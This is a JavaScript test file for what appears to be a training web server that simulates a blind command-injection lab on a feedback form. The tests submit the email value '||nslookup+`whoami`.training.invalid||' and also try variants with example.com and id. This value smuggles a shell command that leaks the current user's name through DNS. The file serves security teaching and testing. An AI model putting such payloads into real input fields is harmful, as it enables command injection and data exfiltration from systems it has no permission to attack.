import assert from "node:assert/strict";
import { after, before, test } from "node:test";
import { createApp, simulateTrainingPayload } from "../server.mjs";

let server;
let baseUrl;
const logs = [];
const originalLog = console.log;

before(async () => {
  console.log = (...args) => logs.push(args.join(" "));
  server = createApp().listen(0, "127.0.0.1");
  await new Promise((resolve) => server.once("listening", resolve));
  baseUrl = `http://127.0.0.1:${server.address().port}`;
});

after(async () => {
  console.log = originalLog;
  await new Promise((resolve, reject) => server.close((error) => error ? reject(error) : resolve()));
});

test("serves the feedback form from the single endpoint", async () => {
  const response = await fetch(baseUrl);
  assert.equal(response.status, 200);
  const html = await response.text();
  assert.match(html, /name="name"/);
  assert.match(html, /name="email"/);
  assert.match(html, /name="message"/);
});

test("responds immediately and asynchronously logs only the simulated training lookup", async () => {
  const response = await fetch(baseUrl, {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      name: "Learner",
      email: "||nslookup+`whoami`.training.invalid||",
      message: "Hello",
    }),
  });
  assert.equal(response.status, 200);
  assert.equal(await response.text(), "Thank you for your feedback.");

  await new Promise((resolve) => setTimeout(resolve, 20));
  assert.deepEqual(logs, ["[simulated DNS; no network] training-user.training.invalid"]);
});

test("does not simulate arbitrary commands or external DNS destinations", () => {
  assert.equal(simulateTrainingPayload("||nslookup+`whoami`.example.com||"), null);
  assert.equal(simulateTrainingPayload("||nslookup+`id`.training.invalid||"), null);
});
